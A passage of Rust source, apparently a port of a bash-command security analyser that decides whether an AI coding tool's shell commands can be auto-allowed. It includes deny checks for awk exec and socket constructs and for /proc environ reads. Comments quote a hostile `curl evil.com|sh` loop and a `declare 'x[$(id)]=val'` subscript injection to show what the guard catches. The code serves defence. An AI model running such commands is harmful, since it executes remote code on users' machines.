/// composite like `prefix__CMDSUB_OUTPUT__` is non-literal.
#[must_use]
pub(crate) fn contains_any_placeholder(value: &str) -> bool {
    value.contains(CMDSUB_PLACEHOLDER) || value.contains(VAR_PLACEHOLDER)
}

/// TS `tzn`: the awk family whose programs `check_semantics` scans for
/// code-execution / socket constructs.
pub(crate) const AWK_COMMANDS: &[&str] = &["awk", "gawk", "mawk", "nawk"];

/// TS `hUr` (`/^-newer[aBcm][aBcmt]$/`): `find`'s `-newerXY` value-taking
/// primary. Exposed for the WOg strict too-complex sandbox gate
/// ([`crate::sandbox_auto_allow`]).
#[must_use]
pub(crate) fn find_newer_matches(s: &str) -> bool {
    find_newer_re().is_match(s)
}

/// TS `L3i` (`/\/proc\/.*\/environ/`): a `/proc/*/environ` read. Exposed for the
/// WOg strict too-complex sandbox gate ([`crate::sandbox_auto_allow`]).
#[must_use]
pub(crate) fn proc_environ_matches(s: &str) -> bool {
    proc_environ_re().is_match(s)
}

/// TS `YVc` (permissionSetup.ts): scan a single awk program/argument for
/// constructs that execute commands or open sockets. Returns the byte-exact deny
/// reason, or `None` when clean. Also reused over `$(cat <<'EOF' … )` heredoc
/// bodies by [`extract_safe_cat_heredoc`].
fn yvc_awk_program(e: &str) -> Option<&'static str> {
    if awk_system_re().is_match(e) {
        return Some("awk program contains system() which executes arbitrary commands");
    }
    if awk_pipe_cmd_re().is_match(e) || awk_pipe_getline_re().is_match(e) {
        return Some(
            "awk program contains a command pipe (| \"cmd\" or | getline) which executes arbitrary commands",
        );
    }
    if awk_include_re().is_match(e) {
        return Some(
            "awk program contains @load/@include or an @indirect call which can execute arbitrary code",
        );
    }
    if awk_extension_re().is_match(e) {
        return Some(
            "awk program contains extension() which loads arbitrary native code (legacy gawk)",
        );
    }
    if awk_inet_re().is_match(e) {
        return Some("awk program opens a gawk /inet/ network socket which can exfiltrate data");
    }
    None
}

/// TS `nodeTypeId` (ast.ts:213). Analytics-only (no security effect). `None` →
/// `-2` (pre-check); `"ERROR"` → `-1`; a [`DANGEROUS_TYPES`] member → its
/// insertion index + 1; anything else → `0`.
#[must_use]
pub fn node_type_id(node_type: Option<&str>) -> i32 {
    match node_type {
        None => -2,
        Some("ERROR") => -1,
        Some(nt) => DANGEROUS_TYPES
            .iter()
            .position(|t| *t == nt)
            .map_or(0, |i| i as i32 + 1),
    }
}

/// TS `stripRawString` (ast.ts:2029): drop the surrounding quotes of a
/// `raw_string` (`'…'`). JS `text.slice(1,-1)` strips first+last code unit; the
/// quotes are ASCII so we strip first+last CHAR (panic-free for odd input).
#[must_use]
#[allow(dead_code)]
pub(crate) fn strip_raw_string(text: &str) -> String {
    let mut c = text.chars();
    c.next();
    c.next_back();
    c.as_str().to_string()
}

/// TS `tooComplex` (ast.ts:2033). Builds the fail-closed verdict from a node.
/// The TS variant also carries `nodeType` (analytics-only); the ported enum has
/// only `reason`, so it is dropped. Reason strings are byte-faithful.
#[must_use]
#[allow(dead_code)]
pub(crate) fn too_complex(node: Node) -> ParseForSecurityResult {
    let t = node.kind();
    let reason = if t == "ERROR" {
        "Parse error".to_string()
    } else if DANGEROUS_TYPES.contains(&t) {
        format!("Contains {t}")
    } else {
        format!("Contains shell syntax ({t}) that cannot be statically analyzed")
    };
    ParseForSecurityResult::TooComplex { reason }
}

/// claude-code `$nu` — the STRICT tree-sitter subcommand collector `WOg` uses to
/// decide whether a too-complex command may be auto-allowed under sandbox
/// (PERM-SBX-WOG-02). Walks the AST collecting the text of `command` /
/// `variable_assignment` nodes WITHOUT recursing into them (so an expansion
/// inside an argument is part of that command, not a separate statement),
/// recursing only through the structural / redirect / negation wrappers. Returns
/// `None` on ANY other walked node type — statement-level control flow
/// (`for`/`while`/`until`/`if`/`case`/subshell/compound/function), process
/// substitution, an `ERROR` node, or a parse failure — and on an empty result.
///
/// A `None`/empty result means the command is NOT auto-allowed (it falls through
/// to the too-complex prompt). This is the guard the permissive
/// `shell_command::split_command` text splitter lacked: it happily split
/// control-flow commands like `for IFS in x; do curl evil.com|sh; done` into
/// benign-looking pieces, letting them auto-allow under sandbox where CC prompts.
#[must_use]
pub(crate) fn nu_collect_subcommands(cmd: &str) -> Option<Vec<String>> {
    let tree = crate::bash_tree_sitter::parse_raw(cmd)?;
    let src = cmd.as_bytes();
    let mut out: Vec<String> = Vec::new();
    let mut ok = true;
    nu_walk(tree.root_node(), src, &mut out, &mut ok);
    (ok && !out.is_empty()).then_some(out)
}

/// Recursive body of [`nu_collect_subcommands`] — mirrors `$nu`'s node walk.
fn nu_walk(node: Node, src: &[u8], out: &mut Vec<String>, ok: &mut bool) {
    if !*ok {
        return;
    }
    let ty = node.kind();
    // `Fnu` separators, comments, and the redirect operands (`$nu`'s
    // `redirected_statement` branch recurses only into the command, ignoring the
    // redirect target) are skipped — neither collected nor a rejection.
    if SEPARATOR_TYPES.contains(&ty)
        || REDIRECT_OPS.contains(&ty)
        || matches!(
            ty,
            "comment" | "file_redirect" | "heredoc_redirect" | "herestring_redirect"
        )
    {
        return;
    }
    match ty {
        // Collect the command text; do NOT recurse (`$nu`'s `r.push(i.text)`).
        "command" | "variable_assignment" => {
            if let Ok(text) = node.utf8_text(src) {
                out.push(text.to_string());
            }
        }
        // Structural / redirect / negation wrappers: recurse into children.
        "program" | "list" | "pipeline" | "redirected_statement" | "negated_command" => {
            let mut c = node.walk();
            for child in node.children(&mut c) {
                nu_walk(child, src, out, ok);
                if !*ok {
                    return;
                }
            }
        }
        // Any other walked node — statement-level control flow, subshell, process
        // substitution, ERROR, etc. — cannot be reduced to simple subcommands.
        _ => *ok = false,
    }
}

/// TS `LVc.homedir()` (`os.homedir()`): the current user's home directory, used
/// by [`resolve_simple_expansion`] to resolve an untracked `$HOME`. Empty when
/// unset (mirrors `os.homedir()` returning `""`). `HOME` is the posix source of
/// truth; the platform-specific fallbacks are an accepted divergence.
fn home_dir() -> String {
    std::env::var("HOME").unwrap_or_default()
}

/// TS `resolveSimpleExpansion` (ast.ts:1937). Resolve a `simple_expansion`
/// (`$VAR`) node against `var_scope`. `Ok(s)` = the resolved value (the real
/// literal for tracked literals, [`VAR_PLACEHOLDER`] for shell-controlled vars);
/// `Err(TooComplex)` = fail-closed. The bare-vs-`inside_string` asymmetry is the
/// core invariant (see the inline SECURITY notes in `ast.ts`).
#[allow(dead_code)]
pub(crate) fn resolve_simple_expansion(
    node: Node,
    src: &[u8],
    var_scope: &HashMap<String, String>,
    inside_string: bool,
) -> Result<String, ParseForSecurityResult> {
    let mut var_name: Option<String> = None;
    let mut is_special = false;
    let mut cursor = node.walk();
    for c in node.children(&mut cursor) {
        if c.kind() == "variable_name" {
            var_name = Some(c.utf8_text(src).unwrap_or("").to_string());
            break;
        }
        if c.kind() == "special_variable_name" {
            var_name = Some(c.utf8_text(src).unwrap_or("").to_string());
            is_special = true;
            break;
        }
    }
    let var_name = match var_name {
        Some(v) => v,
        None => return Err(too_complex(node)),
    };
    if let Some(tv) = var_scope.get(&var_name) {
        // GVc: a generally-volatile variable NAME (RANDOM/SECONDS/REPLY/PS*/…)
        // never yields its tracked literal — its runtime value differs. Inside a
        // string it degrades to a placeholder only when also a safe-env name
        // (except BASHPID, whose value is a concrete pid); bare, it rejects.
        if VOLATILE_VARS_GVC.contains(&var_name.as_str()) {
            if inside_string && SAFE_ENV_VARS.contains(&var_name.as_str()) && var_name != "BASHPID"
            {
                return Ok(VAR_PLACEHOLDER.to_string());
            }
            return Err(too_complex(node));
        }
        if contains_any_placeholder(tv) {
            // Non-literal: bare → reject, inside string → the COMPOSITE value (so
            // a prefix like `pre__TRACKED_VAR__` survives into rule matching).
            if !inside_string {
                return Err(too_complex(node));
            }
            return Ok(tv.clone());
        }
        // Pure literal — return it directly so downstream path validation sees
        // the REAL value. Bare args additionally reject empty / IFS+glob chars.
        if !inside_string {
            if tv.is_empty() {
                return Err(too_complex(node));
            }
            if bare_var_unsafe_re().is_match(tv) {
                return Err(too_complex(node));
            }
        }
        return Ok(tv.clone());
    }
    // Untracked `$HOME` resolves to the real home directory (bare additionally
    // rejects an empty / word-split-unsafe value).
    if var_name == "HOME" {
        let s = home_dir();
        if !inside_string && (s.is_empty() || bare_var_unsafe_re().is_match(&s)) {
            return Err(too_complex(node));
        }
        return Ok(s);
    }
    // Untracked: SAFE_ENV_VARS / special+positional vars resolvable only inside
    // strings (value is shell-controlled).
    if inside_string {
        if SAFE_ENV_VARS.contains(&var_name.as_str()) {
            return Ok(VAR_PLACEHOLDER.to_string());
        }
        if is_special
            && (SPECIAL_VAR_NAMES.contains(&var_name.as_str())
                || (!var_name.is_empty() && var_name.bytes().all(|b| b.is_ascii_digit())))
        {
            return Ok(VAR_PLACEHOLDER.to_string());
        }
    }
    Err(too_complex(node))
}

/// TS `applyVarToScope` (ast.ts:2017). Apply a `name=value` (or `+=` append) to
/// `var_scope`. If the combined value contains any placeholder it is stored as
/// [`VAR_PLACEHOLDER`] so a later `$name` correctly rejects as a bare arg.
#[allow(dead_code)]
pub(crate) fn apply_var_to_scope(
    var_scope: &mut HashMap<String, String>,
    name: &str,
    value: &str,
    is_append: bool,
) {
    let existing = var_scope.get(name).cloned().unwrap_or_default();
    let combined = if is_append {
        format!("{existing}{value}")
    } else {
        value.to_string()
    };
    let stored = if contains_any_placeholder(&combined) {
        VAR_PLACEHOLDER.to_string()
    } else {
        combined
    };
    var_scope.insert(name.to_string(), stored);
}

// ────────────────────────────────────────────────────────────────────────────
// L2: arg / value / assignment / heredoc walkers.
//
// Faithful 1:1 port of `ast.ts` walkArgument (1399), walkString (1508),
// walkArithmetic (1675), collectCommandSubstitution (1374),
// walkVariableAssignment (1777), extractSafeCatHeredoc (1721),
// walkHeredocRedirect (1143), walkHerestringRedirect (1211), walkTestExpr (962).
//
// Return convention mirrors the TS unions:
//   TS `string | ParseForSecurityResult`        → `Result<String, ParseForSecurityResult>`
//   TS `ParseForSecurityResult | null`          → `Option<ParseForSecurityResult>` (None = ok)
//   TS `string | 'DANGEROUS' | null`            → [`CatHeredoc`]
//   TS `{name,value,isAppend} | result`         → `Result<VarAssign, ParseForSecurityResult>`
//
// tree-sitter `Node` has no `.text`; `src: &[u8]` is threaded through every
// walker and node text read via `node.utf8_text(src).unwrap_or("")` (the
// pre-checks already rejected control / Unicode-ws, so invalid-UTF-8 is treated
// as "" defensively). `collect_commands` (the L3 statement-driver) is a DEP; a
// fail-closed stand-in is provided below until L3 lands.
// ────────────────────────────────────────────────────────────────────────────

/// TS `node.text` — the node's source span. utf8 failure (pre-checks already ran)
/// is treated as `""` defensively.
#[allow(dead_code)]
fn node_text<'a>(node: Node, src: &'a [u8]) -> &'a str {
    node.utf8_text(src).unwrap_or("")
}

/// Iterate ALL children of `node` (named + anonymous tokens), matching TS
/// `node.children`. One cursor per node (tree-sitter requirement).
#[allow(dead_code)]
fn children(node: Node<'_>) -> Vec<Node<'_>> {
    let mut cursor = node.walk();
    node.children(&mut cursor).collect()
}

/// TS `P3i` (ast.ts): best-effort STATIC text of an argument node. `None` = the
/// node is not statically representable (used only by the [`pur`] pre-scan).
fn p3i(node: Node, src: &[u8]) -> Option<String> {
    match node.kind() {
        "word" | "number" => Some(unescape_word(node_text(node, src))),
        "raw_string" => Some(strip_raw_string(node_text(node, src))),
        "string" => {
            let inner: Vec<Node> = children(node)
                .into_iter()
                .filter(|c| c.kind() != "\"")
                .collect();
            if inner.is_empty() {
                return Some(String::new());
            }
            if inner.len() == 1 && inner[0].kind() == "string_content" {
                return Some(node_text(inner[0], src).to_string());
            }
            None
        }
        "concatenation" => {
            let mut t = String::new();
            for c in children(node) {
                t.push_str(&p3i(c, src)?);
            }
            Some(t)
        }
        _ => None,
    }
}

/// TS `HVc` (ast.ts): mark every variable an `unset` (given its operand nodes)
/// may remove as unknown ([`VAR_PLACEHOLDER`]) in `scope`. A non-identifier /
/// pattern operand invalidates the WHOLE scope (fail-safe over-invalidation).
fn hvc(operands: &[Node], src: &[u8], scope: &mut HashMap<String, String>) {
    let invalidate_all = |scope: &mut HashMap<String, String>| {
        let keys: Vec<String> = scope.keys().cloned().collect();
        for k in keys {
            scope.insert(k, VAR_PLACEHOLDER.to_string());
        }
    };
    for n in operands {
        match n.kind() {
            "unset" | "file_redirect" | "heredoc_redirect" | "herestring_redirect" => continue,
            "variable_name" => {
                let name = node_text(*n, src).replace('\\', "");
                scope.insert(name, VAR_PLACEHOLDER.to_string());
                continue;
            }
            "word" => {
                let text = node_text(*n, src);
                if text.starts_with('-') {
                    if text == "--" || hvc_fvn_flag_re().is_match(text) {
                        continue;
                    }
                    invalidate_all(scope);
                    continue;
                }
                if hvc_bslash_name_re().is_match(text) {
                    let name = text.strip_prefix('\\').unwrap_or(text).to_string();
                    scope.insert(name, VAR_PLACEHOLDER.to_string());
                    continue;
                }
            }
            _ => {}
        }
        invalidate_all(scope);
    }
}

/// TS `pUr` (ast.ts): recursively pre-scan `node`, marking every variable its
/// body MAY write (assignments, loop vars, `read`/`mapfile`/`unset`,
/// `cd`→PWD/OLDPWD, `pushd`/`popd`→DIRSTACK) as unknown in `scope`. Isolated
/// scopes (`function_definition`/`subshell`/`command_substitution`/
/// `process_substitution`) do NOT leak writes and are skipped.
fn pur(node: Node, src: &[u8], scope: &mut HashMap<String, String>) {
    let kind = node.kind();
    if matches!(
        kind,
        "function_definition" | "subshell" | "command_substitution" | "process_substitution"
    ) {
        return;
    }
    if kind == "pipeline" {
        // Only the LAST non-separator stage runs in the current shell.
        let mut last: Option<Node> = None;
        for c in children(node) {
            if !SEPARATOR_TYPES.contains(&c.kind()) {
                last = Some(c);
            }
        }
        if let Some(l) = last {
            pur(l, src, scope);
        }
        return;
    }
    if kind == "list" || kind == "program" {
        let kids = children(node);
        for (n, o) in kids.iter().enumerate() {
            if SEPARATOR_TYPES.contains(&o.kind()) {
                continue;
            }
            // Skip a background job (`cmd &`) — it runs in a subshell.
            if kids.get(n + 1).map(|x| x.kind()) == Some("&") {
                continue;
            }
            pur(*o, src, scope);
        }
        return;
    }
    if kind == "variable_assignment" {
        for r in children(node) {
            if r.kind() == "variable_name" {
                scope.insert(node_text(r, src).to_string(), VAR_PLACEHOLDER.to_string());
                break;
            }
        }
    }
    if kind == "for_statement" {
        for r in children(node) {
            if r.kind() == "variable_name" {
                scope.insert(node_text(r, src).to_string(), VAR_PLACEHOLDER.to_string());
                break;
            }
        }
    }
    if kind == "unset_command" {
        hvc(&children(node), src, scope);
    }
    if kind == "command" {
        let mut name_node: Option<Node> = None;
        let mut cmd: Option<String> = None;
        let mut o: Vec<String> = Vec::new();
        let mut arg_nodes: Vec<Node> = Vec::new();
        let mut saw_name = false;
        for p in children(node) {
            if p.kind() == "command_name" {
                name_node = Some(p);
                let first = children(p).into_iter().next().unwrap_or(p);
                cmd = p3i(first, src);
                saw_name = true;
            } else if !saw_name
                || matches!(
                    p.kind(),
                    "file_redirect" | "herestring_redirect" | "heredoc_redirect"
                )
            {
                // leading assignments / redirects — not positional args
            } else {
                o.push(p3i(p, src).unwrap_or_default());
                arg_nodes.push(p);
            }
        }
        // Strip command-prefix wrappers (env-style assignments write vars).
        let mut idx = 0usize;
        while cmd
            .as_deref()
            .is_some_and(|c| XEG_WRAPPERS.contains(&c) || c == "!")
        {
            while idx < o.len() {
                let p = &o[idx];
                if xeg_wrapper_flag_re().is_match(p) {
                    idx += 1;
                } else if xeg_assign_word_re().is_match(p) {
                    if let Some(id) = leading_ident(p) {
                        scope.insert(id.to_string(), VAR_PLACEHOLDER.to_string());
                    }
                    idx += 1;
                } else {
                    break;
                }
            }
            cmd = o.get(idx).cloned();
            idx += 1;
        }
        let args: &[String] = o.get(idx..).unwrap_or(&[]);
        let unwrapped_arg_nodes: &[Node] = arg_nodes.get(idx..).unwrap_or(&[]);
        let mark = |scope: &mut HashMap<String, String>, p: &str| {
            if valid_var_name_re().is_match(p) {
                scope.insert(p.to_string(), VAR_PLACEHOLDER.to_string());
            }
        };
        match cmd.as_deref() {
            Some("read") => {
                scope.insert("REPLY".to_string(), VAR_PLACEHOLDER.to_string());
                let mut p = 0;
                let mut dd = false;
                while p < args.len() {
                    let m = &args[p];
                    if !dd && m == "--" {
                        dd = true;
                        p += 1;
                        continue;
                    }
                    if !dd && m.starts_with('-') {
                        if READ_DATA_FLAGS.contains(&m.as_str()) {
                            p += 2;
                            continue;
                        }
                        let mb = m.as_bytes();
                        let mut g = 1;
                        let mut consumed = false;
                        while g < m.len() {
                            let y = mb[g];
                            if y == b'a' || y == b'A' {
                                let val = if g < m.len() - 1 {
                                    m[g + 1..].to_string()
                                } else {
                                    args.get(p + 1).cloned().unwrap_or_default()
                                };
                                mark(scope, &val);
                                consumed = g == m.len() - 1;
                                break;
                            }
                            let flag = format!("-{}", y as char);
                            if READ_DATA_FLAGS.contains(&flag.as_str()) {
                                consumed = g == m.len() - 1;
                                break;
                            }
                            g += 1;
                        }
                        p += if consumed { 2 } else { 1 };
                        continue;
                    }
                    mark(scope, m);
                    p += 1;
                }
            }
            Some(c) if c == "mapfile" || c == "readarray" => {
                scope.insert("MAPFILE".to_string(), VAR_PLACEHOLDER.to_string());
                let mut p = 0;
                while p < args.len() {
                    let f = &args[p];
                    if f.starts_with('-') {
                        if xeg_mapfile_flag_re().is_match(f) {
                            p += 1;
                        }
                        p += 1;
                        continue;
                    }
                    mark(scope, f);
                    p += 1;
                }
            }
            Some("unset") => hvc(unwrapped_arg_nodes, src, scope),
            _ => {}
        }
        // Recurse into children, but skip env-prefix `variable_assignment`s when
        // the command is an ordinary external command (those writes are local).
        let cname = name_node
            .and_then(|n| children(n).into_iter().next())
            .filter(|c| c.kind() == "word")
            .map(|c| unescape_word(node_text(c, src)));
        let skip_env_assigns = cname.as_deref().is_some_and(|u| {
            !XEG_SPECIAL_BUILTINS.contains(&u)
                && !XEG_WRAPPERS.contains(&u)
                && !XEG_ASSIGN_BUILTINS.contains(&u)
        });
        for p in children(node) {
            if p.kind() == "variable_assignment" && skip_env_assigns {
                continue;
            }
            pur(p, src, scope);
        }
        return;
    }
    if kind == "declaration_command" {
        for r in children(node) {
            if matches!(
                r.kind(),
                "string" | "raw_string" | "word" | "number" | "concatenation" | "variable_name"
            ) {
                let text = node_text(r, src);
                let cleaned: String = text
                    .chars()
                    .filter(|c| !matches!(c, '\'' | '"' | '\\'))
                    .collect();
                if let Some(caps) = pur_decl_assign_re().captures(&cleaned) {
                    scope.insert(caps[1].to_string(), VAR_PLACEHOLDER.to_string());
                } else if let Some(eq) = cleaned.find('=') {
                    // `x=$…` with a `$` before the `=` → invalidate the whole scope.
                    if eq > 0 && cleaned[..eq].contains('$') {
                        let keys: Vec<String> = scope.keys().cloned().collect();
                        for k in keys {
                            scope.insert(k, VAR_PLACEHOLDER.to_string());
                        }
                    }
                }
            }
        }
    }
    for r in children(node) {
        pur(r, src, scope);
    }
}

/// TS `E3i(scope, node)` = `pUr(node, scope)` (argument swap only).
fn e3i(scope: &mut HashMap<String, String>, node: Node, src: &[u8]) {
    pur(node, src, scope);
}

/// TS `dUr` (ast.ts): merge a walked body scope back into `outer`. Any variable
/// the body changed becomes unknown; any outer variable the body did not carry
/// forward becomes unknown (it may have been unset inside the body).
fn dur(outer: &mut HashMap<String, String>, body: &HashMap<String, String>) {
    for (k, v) in body {
        if let Some(o) = outer.get(k) {
            if o != v {
                outer.insert(k.clone(), VAR_PLACEHOLDER.to_string());
            }
        }
    }
    let keys: Vec<String> = outer.keys().cloned().collect();
    for k in keys {
        if !body.contains_key(&k) {
            outer.insert(k, VAR_PLACEHOLDER.to_string());
        }
    }
}

/// A leading `name=value` / `name+=value` assignment (TS
/// `{name,value,isAppend}`, ast.ts:1781 return shape).
#[derive(Debug, Clone, PartialEq, Eq)]
#[allow(dead_code)]
pub(crate) struct VarAssign {
    /// Variable name (validated `[A-Za-z_][A-Za-z0-9_]*`).
    pub name: String,
    /// Resolved value (literal, or a placeholder for cmdsub/unknown-var values).
    pub value: String,
    /// `+=` append (vs `=` set).
    pub is_append: bool,
}

/// Validate an assignment to a shell variable with bash's integer attribute.
/// Integer assignment arithmetically evaluates its RHS, so only the exact
/// decimal-literal subset is safe to model. The oracle applies this check to
/// bare assignments and command env-prefix assignments at different points;
/// `env_prefix` selects their byte-exact reason string.
fn integer_attribute_assignment_error(
    name: &str,
    value: &str,
    env_prefix: bool,
) -> Option<ParseForSecurityResult> {
    if !DANGEROUS_VAR_Y3I.contains(&name) {
        return None;
    }
    if value.contains('[')
        || value.contains('`')
        || value.contains("$(")
        || contains_any_placeholder(value)
        || !integer_attribute_value_re().is_match(value)
    {
        let reason = if env_prefix {
            format!(
                "{name} has integer attribute — env-prefix arith-evals value, which can execute subscript command substitution or abort/diverge at runtime"
            )
        } else {
            format!(
                "{name} has integer attribute — assignment arith-evals RHS, which can execute subscript command substitution or abort/diverge at runtime"
            )
        };
        return Some(ParseForSecurityResult::TooComplex { reason });
    }
    None
}

/// TS `extractSafeCatHeredoc` return (ast.ts:1721) `string | 'DANGEROUS' | null`.
#[derive(Debug, Clone, PartialEq, Eq)]
#[allow(dead_code)]
pub(crate) enum CatHeredoc {
    /// The heredoc body (a safe `$(cat <<'EOF' … EOF)` static result).
    Body(String),
    /// Body matched a dangerous pattern (`/proc/*/environ` or jq `system(`).
    Dangerous,
    /// Not a safe cat-heredoc shape (caller falls through to general `$()`).
    None,
}

/// TS `collectCommands` (ast.ts:482). Recursively collect leaf `command` nodes
/// from a structural wrapper node. `None` = success; `Some(err)` = fail-closed
/// on a disallowed node type. Mirrors the varScope-snapshot semantics: `&&`/`;`
/// carry scope linearly; `||`/`|`/`|&`/`&` reset to the entry snapshot; pipelines
/// run on a COPY so stages never mutate the caller's scope. Any unhandled node
/// type falls to the default `too_complex` (over-ask), NEVER silently succeeds.
#[allow(dead_code)]
pub(crate) fn collect_commands(
    node: Node,
    commands: &mut Vec<SimpleCommand>,
    var_scope: &mut HashMap<String, String>,
    src: &[u8],
) -> Option<ParseForSecurityResult> {
    let kind = node.kind();

    if kind == "command" {
        // Pass `commands` as the innerCommands accumulator — any $() extracted
        // during walk_command gets appended alongside the outer command.
        match walk_command(node, &[], commands, var_scope, src) {
            ParseForSecurityResult::Simple { commands: cs } => {
                commands.extend(cs);
                return None;
            }
            other => return Some(other),
        }
    }

    if kind == "redirected_statement" {
        return walk_redirected_statement(node, commands, var_scope, src);
    }

    if kind == "comment" {
        return None;
    }

    if STRUCTURAL_TYPES.contains(&kind) {
        // SECURITY: `||`, `|`, `|&`, `&` must NOT carry varScope linearly (see
        // ast.ts:504 for the flag-omission attack). Snapshot the incoming scope;
        // reset to it after those separators. `&&`/`;` DO carry scope.
        let is_pipeline = kind == "pipeline";
        let mut needs_snapshot = false;
        if !is_pipeline {
            for c in children(node) {
                if c.kind() == "||" || c.kind() == "&" {
                    needs_snapshot = true;
                    break;
                }
            }
        }
        let snapshot: Option<HashMap<String, String>> = if needs_snapshot {
            Some(var_scope.clone())
        } else {
            None
        };
        // For `pipeline`, ALL stages run in subshells → start with a COPY so
        // nothing mutates the caller's scope. For `list`/`program`, the `&&`/`;`
        // chain mutates the caller's scope; fork only on `||`/`&`.
        let mut owned_scope: Option<HashMap<String, String>> = if is_pipeline {
            Some(var_scope.clone())
        } else {
            None
        };
        for child in children(node) {
            let ck = child.kind();
            if SEPARATOR_TYPES.contains(&ck) {
                if ck == "||" || ck == "|" || ck == "|&" || ck == "&" {
                    // `|`/`|&` only appear under `pipeline`; `||`/`&` under list.
                    let base = snapshot.as_ref().unwrap_or(&*var_scope);
                    owned_scope = Some(base.clone());
                }
                continue;
            }
            let scope: &mut HashMap<String, String> = owned_scope.as_mut().unwrap_or(var_scope);
            if let Some(err) = collect_commands(child, commands, scope, src) {
                return Some(err);
            }
        }
        return None;
    }

    if kind == "negated_command" {
        // `! cmd` inverts exit code only. Recurse into the wrapped command.
        for child in children(node) {
            if child.kind() == "!" {
                continue;
            }
            return collect_commands(child, commands, var_scope, src);
        }
        return None;
    }

    if kind == "declaration_command" {
        // `export`/`local`/`readonly`/`declare`/`typeset`.
        let mut argv: Vec<String> = Vec::new();
        for child in children(node) {
            match child.kind() {
                "export" | "local" | "readonly" | "declare" | "typeset" => {
                    argv.push(node_text(child, src).to_string());
                }
                "word" | "number" | "raw_string" | "string" | "concatenation" => {
                    let arg = match walk_argument(Some(child), src, commands, var_scope) {
                        Ok(s) => s,
                        Err(e) => return Some(e),
                    };
                    // SECURITY: declare/typeset/local flags that change assignment
                    // semantics (-n nameref, -i integer, -a/-A array) break the
                    // static model. Check the RESOLVED arg.
                    if (argv.first().map(String::as_str) == Some("declare")
                        || argv.first().map(String::as_str) == Some("typeset")
                        || argv.first().map(String::as_str) == Some("local"))
                        && declare_flag_re().is_match(&arg)
                    {
                        return Some(ParseForSecurityResult::TooComplex {
                            reason: format!(
                                "declare flag {arg} changes assignment semantics (nameref/integer/array)"
                            ),
                        });
                    }
                    // SECURITY: bare positional with a subscript also evaluates
                    // (`declare 'x[$(id)]=val'` runs $(id) in the subscript).
                    if (argv.first().map(String::as_str) == Some("declare")
                        || argv.first().map(String::as_str) == Some("typeset")
                        || argv.first().map(String::as_str) == Some("local"))
                        && !arg.starts_with('-')
                        && declare_subscript_re().is_match(&arg)
                    {
                        return Some(ParseForSecurityResult::TooComplex {
                            reason: format!(
                                "declare positional '{arg}' contains array subscript — bash evaluates $(cmd) in subscripts"
                            ),
                        });
                    }
                    argv.push(arg);
                }
                "variable_assignment" => {
                    let ev = match walk_variable_assignment(child, commands, var_scope, src) {
                        Ok(ev) => ev,
                        Err(e) => return Some(e),
                    };
                    // export/declare assignments populate the scope so later $VAR
                    // refs resolve.
                    let pair = format!("{}={}", ev.name, ev.value);
                    apply_var_to_scope(var_scope, &ev.name, &ev.value, ev.is_append);
                    argv.push(pair);
                }
                "variable_name" => {
                    // `export FOO` — bare name, no assignment.
                    argv.push(node_text(child, src).to_string());
                }
                _ => return Some(too_complex(child)),
            }
        }
        commands.push(SimpleCommand {
            argv,
            env_vars: Vec::new(),
            redirects: Vec::new(),
            text: node_text(node, src).to_string(),
        });
        return None;
    }

    if kind == "variable_assignment" {
        // Bare `VAR=value` at statement level — inert, no command pushed.
        let ev = match walk_variable_assignment(node, commands, var_scope, src) {
            Ok(ev) => ev,
            Err(e) => return Some(e),
        };
        // Integer-attributed variables arithmetically evaluate bare assignment
        // RHS values; reject anything outside the oracle's decimal subset
        // before recording the value in the tracked scope.
        if let Some(err) = integer_attribute_assignment_error(&ev.name, &ev.value, false) {
            return Some(err);
        }
        apply_var_to_scope(var_scope, &ev.name, &ev.value, ev.is_append);
        return None;
    }

    if kind == "for_statement" {
        // NOTE: the TS `mP()` env-scrub gate (reject for/while outright when
        // CLAUDE_CODE_SUBPROCESS_ENV_SCRUB is set) is a runtime feature flag; the
        // port runs the flag-OFF default (full static analysis).
        let mut loop_var: Option<String> = None;
        let mut do_group: Option<Node> = None;
        for child in children(node) {
            match child.kind() {
                "variable_name" => loop_var = Some(node_text(child, src).to_string()),
                "do_group" => do_group = Some(child),
                // SECURITY: `select` reads stdin into $REPLY — cannot model.
                "select" => {
                    return Some(ParseForSecurityResult::TooComplex {
                        reason: "select statement reads stdin into $REPLY; cannot statically model"
                            .to_string(),
                    })
                }
                "for" | "in" | ";" => {}
                "command_substitution" => {
                    if let Some(err) = collect_command_substitution(child, commands, var_scope, src)
                    {
                        return Some(err);
                    }
                }
                _ => {
                    // Iteration values: validated (value discarded; body uses
                    // VAR_PLACEHOLDER regardless).
                    if let Err(e) = walk_argument(Some(child), src, commands, var_scope) {
                        return Some(e);
                    }
                }
            }
        }
        let (loop_var, do_group) = match (loop_var, do_group) {
            (Some(v), Some(g)) => (v, g),
            _ => return Some(too_complex(node)),
        };
        // SECURITY: a loop var that aliases an exec-influencing / integer-attr /
        // safe-env / volatile name bypasses assignment validation.
        if loop_var == "PS4"
            || loop_var == "IFS"
            || o3i(&loop_var)
            || DANGEROUS_VAR_Y3I.contains(&loop_var.as_str())
            || SAFE_ENV_VARS.contains(&loop_var.as_str())
            || VOLATILE_VARS_GVC.contains(&loop_var.as_str())
        {
            return Some(ParseForSecurityResult::TooComplex {
                reason: format!("{loop_var} as loop variable bypasses assignment validation"),
            });
        }
        // SECURITY: refuse to clobber a tracked literal with the loop var — the
        // post-loop value cannot be statically determined.
        if let Some(existing) = var_scope.get(&loop_var) {
            if !contains_any_placeholder(existing) {
                let truncated: String = existing.chars().take(40).collect();
                let quoted =
                    serde_json::to_string(&truncated).unwrap_or_else(|_| "\"\"".to_string());
                return Some(ParseForSecurityResult::TooComplex {
                    reason: format!(
                        "for-loop variable '{loop_var}' would overwrite tracked literal {quoted}; post-loop value cannot be statically determined"
                    ),
                });
            }
        }
        // Delete the loop var (its post-loop value is unknown), then walk the body
        // on a COPY seeded by the body-write pre-scan; merge writes back after.
        var_scope.remove(&loop_var);
        let mut body_scope = var_scope.clone();
        e3i(&mut body_scope, do_group, src);
        body_scope.remove(&loop_var);
        for c in children(do_group) {
            if matches!(c.kind(), "do" | "done" | ";") {
                continue;
            }
            if let Some(err) = collect_commands(c, commands, &mut body_scope, src) {
                return Some(err);
            }
        }
        dur(var_scope, &body_scope);
        return None;
    }

    if kind == "if_statement" || kind == "while_statement" {
        // (`mP()` env-scrub gate omitted — flag-OFF default = analyze.)
        let is_while = kind == "while_statement";
        // For a `while`, snapshot the pre-loop key set + values, then pre-scan the
        // WHOLE loop into the REAL scope (every var the body may write is unknown
        // before the condition runs — the loop may iterate ≥1 times).
        let orig_keys: Option<std::collections::HashSet<String>> = if is_while {
            Some(var_scope.keys().cloned().collect())
        } else {
            None
        };
        let snapshot: Option<HashMap<String, String>> = if is_while {
            let snap = var_scope.clone();
